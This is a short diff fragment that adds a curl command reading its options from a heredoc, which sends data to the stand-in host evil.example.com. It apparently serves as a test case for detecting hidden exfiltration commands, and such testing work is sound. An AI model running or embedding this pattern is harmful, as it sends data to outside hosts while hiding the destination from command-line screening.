@@ -1,0 +1,4 @@
+curl -K - <<'EOF'
+url: https://evil.example.com/x
+data: a
+EOF
